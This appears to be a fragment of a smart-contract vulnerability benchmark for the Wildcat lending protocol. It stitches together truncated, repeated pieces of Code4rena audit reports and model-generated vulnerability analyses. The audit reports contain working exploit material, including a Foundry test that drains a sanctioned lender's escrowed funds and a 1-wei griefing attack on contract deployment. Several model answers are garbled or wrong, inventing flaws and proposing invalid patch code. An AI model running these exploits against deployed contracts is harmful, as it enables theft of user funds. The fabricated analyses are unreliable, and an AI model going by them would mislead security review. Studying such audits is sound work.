&&\n      IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);\n  }\n```\n\n- Now, based on the previous explanation, we know that the lender's account needs to be sanctioned in the Chainalysis Oracle before the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) is called.\n    - This opens up the doors for lenders who realize that their account has been sanctioned in the Chainalysis Oracle to move their MarketTokens to different accounts before the lender's account is fully blocked in the Market (you may be wondering what's the point of transferring tokens to accounts that have not been granted any role in the Market, I'll explain more about this in a sec, bear with me).\n        - So, the lender transfers his MarketTokens to different accounts using the [`WildcatMarketToken::transfer()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketToken.sol#L36-L39), as a result, the lender's account that is sanction in the Chainalysis Oracle has no MarketTokens anymore, all those tokens have been moved to another accounts.\n            - Now, at this point, anybody could call the nukeFromOrbit() to fully sanction the lender's account in a specific Market, **either way, the Lender has already moved his tokens to other accounts.**\n\n- So, **at this point, the lender's MarketTokens were distributed among different accounts of his own**, ***such accounts have never interacted with the Market***, so, **their current role is the `Null` Role.**\n- Everything might look fine because the accounts where the tokens were sent have no permissions to interact with the Market, but **there is a bug that allows lenders to gain the WithdrawOnly Role on any account they want without having the consent of the borrower**\n    - This problem is located in the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), the reason of this problem will be explained in the below code walkthrough:\n        - In short, **the Lender will be able to set the WithdrawOnly Role to any account he wishes, the reason is that any account that is not registered in the _authorizedLenders variable of the Controller will forward the value of `_isAuthorized` as false**, and in the [`WildMarketConfig::updateAccountAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L112-L126), **because the value of `_isAuthorized` is false, it will end up granting the WithdrawOnly Role.**\n            - This effectively allows any Lender to grant the WithdrawOnly Role to any account they want to.\n\n> WildcatMarketController.sol\n```solidity\n  //@audit-info => Anybody can call this function and pass a lender and an array of markets where the changes will be applied!\n  function updateLenderAuthorization(address lender, address[] memory markets) external {\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly\n        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n```\n\n> EnumerableSet.sol\n```solidity\nfunction contains(AddressSet storage set, address value) internal view returns (bool) {\n    //@audit-info => Calls the internal _contains()\n    //@audit-info => If the given value is found it will return true, otherwise it will return false!\n    return _contains(set._inner, bytes32(uint256(uint160(value))));\n}\n\n//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!\n/**\n* @dev Returns true if the value is in the set. O(1).\n*/\nfunction _contains(Set storage set, bytes32 value) private view returns (bool) {\n    return set._indexes[value] != 0;\n}\n```\n\n> WildcatMarketConfig.sol\n```solidity\n  function updateAccountAuthorization(\n    address _account,\n    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!\n    bool _isAuthorized\n  ) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null\n    //@audit-info => If the account has been blacklisted, tx will revert!\n    Account memory account = _getAccount(_account);\n    if (_isAuthorized) {\n      account.approval = AuthRole.DepositAndWithdraw;\n    \n    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.\n    } else {\n      account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account;\n    _writeState(state);\n    emit AuthorizationStatusUpdated(_account, account.approval);\n  }\n```\n\n- So, at this point, the Lender has been able to move their MarketTokens to different accounts and to grant the WithdrawOnly Role to all of the accounts he wishes to.\n- Now they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved, any of those accounts have now the WithdrawOnly Role and have a balance of MarketTokens, so, the Lender will be able to exit the market from any of those accounts.\n\n\n## Tools Used\nManual Audit\n\n## Recommended Mitigation Steps\n- The mitigation for this problem is very straight-forward, limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), either only allow the Borrower to call it, or create a type of withelist of valid actors who are capable of updating the lender's authorization on the Markets, in this way, the Lenders won't be capable of granting the WithdrawOnly Role to any account they want to, thus, they won't be able even to attempt to escape the sanctions.\n\n> WildcatMarketController.sol\n```solidity\n- function updateLenderAuthorization(address lender, address[] memory markets) external {\n+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\nmodifier onlyAuthorizedEntities() {\n    require(msg.sender == <authorizedEntities>, \"you are not allowed sir\");\n    _;\n}\n```\n\n\n## Assessed type\n\nContext",

However, the code does not validate whether these addresses are actually authorized or not. An attacker can exploit this vulnerability by providing a fake market address as part of the array, which will then be processed and potentially cause unauthorized operations to occur.\n\nTo fix this vulnerability, the smart contract code should perform additional checks to ensure that only legitimate markets are allowed to update account authorization. This can be done by introducing a registry of approved market contracts and checking whether the provided addresses match any of the authorized markets before proceeding with the `updateAccountAuthorization` function call.",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to an Unauthorized Asset Transfer (UAT) attack due to a lack of proper validation mechanisms. The reason for this vulnerability lies in the fact that the function `updateLenderAuthorization` takes in an array of market addresses as a parameter and uses these addresses to update account authorization within each market. However, the function does not properly validate whether these market addresses are legitimate or controlled by the protocol.\n\nAn attacker can exploit this vulnerability by creating a malicious contract that mimics the behavior of an existing legitimate market contract, but with a different purpose. For example, the attacker can create a fake Market B contract that has the same interface as the legitimate Market B contract but has different functionality that allows it to steal assets from users.\n\nTo exploit this vulnerability, the attacker would first need to get the user to call the `updateLenderAuthorization` function with an array of addresses containing both the legitimate Market B address and their fake Market B address. The function would then update account authorization within each market, but the legitimate Market B contract would be updated with the attacker's fake Market B address instead of the original address.\n\nThe user would not realize that they have been tricked because the fake Market B contract has a similar interface to the legitimate Market B contract and can mimic its behavior convincingly. Once the fake Market B contract has been added to the user's account authorization, it can steal assets from the user by calling the `withdraw` function on their behalf.\n\nTo mitigate this vulnerability, a validation mechanism should be implemented in the `updateLenderAuthorization` function that checks whether each market address provided is legitimate and controlled by the protocol before updating account authorization within each market.

                "decompose": "  Based on the given vulnerability knowledge and smart contract code, I can identify several potential vulnerabilities in the contract. However, before providing a detailed analysis, let me summarize the functionality of the code:\n\nThe `updateAccountAuthorization` function is called by the controller to update the approval status of an account. It takes two parameters: `_account`, which is the address of the account to be updated, and `_isAuthorized`, which indicates whether the account should be approved for deposit and withdrawal (true) or only for withdrawal (false). The function updates the `Account` struct of the specified account with the new approval status. Finally, it emits an event indicating that the authorization status has been updated.\n\nNow, let's analyze the potential vulnerabilities in the code:\n\n1. Reentrancy Vulnerability:\nThe function uses the `nonReentrant` modifier to prevent reentrancy attacks. However, it does not use a re-entrancy guard variable that can be used to check if the function is already executing. This means that an attacker could exploit this vulnerability by calling the function multiple times from different accounts, causing the contract's state to become inconsistent.\n2. Unauthorized Access Vulnerability:\nThe `updateAccountAuthorization` function updates the approval status of an account based on the `_isAuthorized` parameter. However, it does not perform any authorization checks to ensure that only the controller can call this function. This means that an attacker could exploit this vulnerability by calling the function with arbitrary values for `_account` and `_isAuthorized`, potentially granting or revoking access to other accounts' funds.\n3. Uninitialized Memory Vulnerability:\nThe `updateAccountAuthorization` function reads the current state of the contract from storage using the `_getUpdatedState()` function. However, it does not initialize the `MarketState` struct before reading its fields. This means that if the contract's state has not been initialized yet, the function will read uninitialized memory, potentially causing a vulnerability.\n4. Integer Overflow and Underflow Vulnerabilities:\nThe `updateAccountAuthorization` function uses integer arithmetic to update the approval status of an account. However, it does not check for integer overflow or underflow conditions. This means that if the",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to the \"Authorization Bypass Through User-Controlled Parameter\" vulnerability.\n\nThe reason for this vulnerability is that the `updateAccountAuthorization` function does not properly verify that the caller of the function has authorization to update the account's approval status. The function only checks if the caller has the `onlyController` role, but does not check if the caller is authorized to update the specified account. This allows an attacker to call the function with a user-controlled parameter (`_account`) and change that user's approval status without proper authorization.\n\nTo demonstrate this vulnerability, we can create a potential Proof of Concept (PoC) as follows:\n\n1. Alice, who is a legitimate account holder, has approved the smart contract to deposit and withdraw from her account.\n2. Bob, who is an attacker, calls the `updateAccountAuthorization` function with Alice's address (`_account`) and sets his own approval status to `AuthRole.DepositAndWithdraw`.\n3. The smart contract updates Alice's approval status without proper authorization, allowing Bob to deposit and withdraw from Alice's account.\n\nTo patch this vulnerability, we can modify the function to properly verify that the caller has authorization to update the specified account. For example, we can add a check if the caller is authorized to update the specified account, or if the caller is the account owner themselves.\n\nHere is an updated version of the `updateAccountAuthorization` function with this patch:\n```csharp\nfunction updateAccountAuthorization(\n    address _account,\n    bool _isAuthorized\n) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    Account memory account = _getAccount(_account);\n    if (!_isAuthorized && !msg.sender.hasRole(\"DepositAndWithdraw\")) {\n        revert(\"Only DepositAndWithdraw role is authorized to update approval status\");\n    }\n    if (_isAuthorized) {\n        account.approval = AuthRole.DepositAndWithdraw;\n    } else {\n        account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account",

The reason for this vulnerability is that the `updateAccountAuthorization` function updates the approval status of a user but does not update the allowances correctly after the redemption process. This allows an authorized user to exploit the system and redeem more tokens than intended.\n\nHere's how the vulnerability can be exploited:\n\n1. An unauthorized user sends a transaction to withdraw tokens from the smart contract. The smart contract verifies that the user has enough approvals, but fails to update the allowances after the redemption process.\n2. The authorized user spends the approved tokens by calling the `updateAccountAuthorization` function with the parameter `_isAuthorized = true`. This updates the approval status of the user, but does not update the allowances correctly.\n3. The unauthorized user sends another transaction to withdraw more tokens from the smart contract. The smart contract verifies that the user has enough approvals and allows the user to redeem more tokens than intended.\n4. The authorized user can repeat step 2 to exploit the vulnerability and redeem even more tokens than they initially had approval for. This leads to a denial-of-service attack on the smart contract, causing it to lose funds.\n\nTo fix this vulnerability, the `updateAccountAuthorization` function should update the allowances correctly after updating the approval status of a user.

This could allow the authorized user to exploit the system by repeatedly calling the `updateAccountAuthorization` function with their own account as the `_account` parameter, causing them to potentially lose funds from other accounts.\n\nTo prevent this vulnerability, the developer should add a check for the caller's identity before updating the account authorization status, ensuring that only the controller can update the authorization status of another account.",

The `updateAccountAuthorization` function allows the calling account to update an account's authorization status for a specific action, such as depositing or withdrawing funds. However, this function does not perform any checks on the caller's current authorization status before updating the account's approval role. This means that an unauthorized actor can invoke this function and update another user's authorization status, potentially granting themselves access to sensitive information or allowing them to manipulate the target account's funds.\n2. The `onlyController` modifier in the function signature indicates that only the contract controller (i.e., the owner of the smart contract) can call this function. However, there is no check within the function body to ensure that the calling account has the appropriate authorization level required to update an account's authorization status. This means that any authorized user could potentially bypass the access control mechanism and grant themselves or another actor the ability to manipulate other users' accounts.\n3. The `nonReentrant` modifier in the function signature indicates that this function cannot be called recursively. However, there is no check within the function body to ensure that an account's authorization status has not already been updated by a previous call to this function. This means that if an authorized user calls this function multiple times with different authorization statuses for the same account, the last status update may be the one that takes effect, potentially granting or revoking access to sensitive information or funds in an unauthorized manner.\n\nOverall, these vulnerabilities could lead to a variety of unintended and potentially malicious consequences, such as unauthorized access to sensitive information, manipulation of user accounts, or theft of funds.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

All ERC20 tokens are being transferred using the `transfer` function, which is defined by the ERC20 standard and is expected to return a boolean indicating whether or not the transfer was successful.\n2. The code does not appear to be using any custom logic for handling token transfers that could potentially lead to inconsistent behavior. For example, there are no checks for whether a token transfer has been successful before attempting to perform other actions.\n3. The code does not appear to be using any wrapper libraries or allow lists for verified tokens, which would be necessary in order to mitigate the \"Inconsistent implementation of ERC20 token transfer functions\" vulnerability.\n\nTherefore, based on the given smart contract code, I conclude that it is not vulnerable to this specific type of vulnerability.",

This could potentially allow them to gain unauthorized access to the escrowed assets or modify the `sanctionOverrides` mapping in a way that allows them to bypass the sanctions system.\n\nTo mitigate this vulnerability, it would be recommended to add additional checks and validations to ensure that the `borrower` and `account` addresses are valid and not malicious. Additionally, it may be necessary to implement additional access control mechanisms to prevent unauthorized modification of the `sanctionOverrides` mapping.",

The `isRegisteredMarket` function returns true if the address is registered, and false otherwise. Therefore, only registered markets are allowed to create escrow contracts.\n\nAdditionally, the `escrowContract` variable is initialized with a non-zero codehash value, which means that the escrow contract has already been created and deployed.

This is because the function is only restricted by the `isRegisteredMarket` check, which can be bypassed if an unauthorized address calls the function directly instead of being passed through the `WildcatSanctionsEscrow` contract.\n\nTo exploit this vulnerability, an attacker could potentially call the `createEscrow` function with a specially crafted `borrower`, `account`, and `asset` parameter values that would bypass the `isRegisteredMarket` check and allow them to create an escrow contract for themselves or someone else. Once the escrow contract is created, the attacker could potentially use it to steal assets from the intended borrower or account holder.\n\nTo mitigate this vulnerability, a potential solution would be to add proper constraints on critical operations accessible by privileged addresses, such as time locks, upper limits on transfers, or indexes for pools in the underlying system.

                "decompose": "  Based on the given vulnerability knowledge and the smart contract code provided, I can identify at least three possible vulnerabilities in the code:\n\n1. Unrestricted Access to Escrow Contracts: The code allows any address to create an escrow contract for a borrower, account, and asset, without checking if the creator has permission to do so. This could lead to unintended or malicious access to the escrow contract by unauthorized parties, potentially allowing them to tamper with the escrowed assets or cause other harm.\n2. Incorrect Escrow Contract Creation: The code creates a new escrow contract using `new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }()`, which is vulnerable to the \"Constructor Code Injection\" attack. This attack could be used by an attacker to deploy malicious code in the escrow contract, potentially allowing them to gain control of the escrowed assets or cause other harm.\n3. Sanction Override: The code allows the creator of the escrow contract to set a sanction override for the borrower's account, which could allow the creator to manipulate the sanctions system and potentially gain control of the borrower's assets. This could be used by an attacker to circumvent the sanctions system and cause harm to the borrower or other parties involved in the escrow process.\n\nTo address these vulnerabilities, I would suggest implementing the following changes:\n\n1. Restrict Access to Escrow Contract Creation: Only allow trusted addresses, such as the Wildcat Arch Controller, to create escrow contracts for a borrower, account, and asset. This can be done by adding an access control mechanism to the `createEscrow` function, such as a modifier that checks if the caller is a trusted address before creating the escrow contract.\n2. Use Safe Escrow Contract Creation: Instead of using the `new` keyword to create a new escrow contract, use a safe and secure method of deployment, such as the `deploy` function provided by the OpenZeppelin library. This will help prevent the \"Constructor Code Injection\" attack and ensure that the escrow contract is created with the correct code and initialization",

The reason for this is that the `createEscrow` function creates an escrow contract address based on the borrower's address, which can be manipulated by a malicious lender or liquidator to block token transfers.\n\nMore specifically, the `getEscrowAddress` function uses the `keccak256` hash function to generate a unique contract address for each escrow based on the borrower's address. However, if a malicious actor has control over the borrower's address, they can create a new escrow contract with the same address as an existing one, potentially causing the borrower to lose access to their tokens.\n\nTo mitigate this vulnerability, I would suggest adding additional checks to ensure that the borrower's address is not controlled by a malicious actor. For example, the code could check if the borrower's address has been flagged as suspicious or compromised in a third-party database.\n\nAdditionally, the code could add a feature to allow users to generate multiple escrow addresses for each borrower, rather than using a single address. This would make it more difficult for malicious actors to manipulate token transfers and potentially reduce the risk of liquidation attacks.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

        "gt": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

        "gt": "\n# Vulnerability details\n\n## Impact\n\nThe `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation Steps\n\n1.

The smart contract code includes a function called `_blockAccount` that takes two parameters - `MarketState memory state` and `address accountAddress`.

The vulnerability occurs when there are deposit fees associated with the scaled balance of an account, but these fees are not handled properly by the smart contract code. This can lead to permanent lockup of funds and make them inaccessible to the users.\n\nTo resolve this vulnerability, it is essential to update the smart contract code to either transfer the deposit fees to a fee receiver or provide a mechanism to retrieve these fees from the contract.

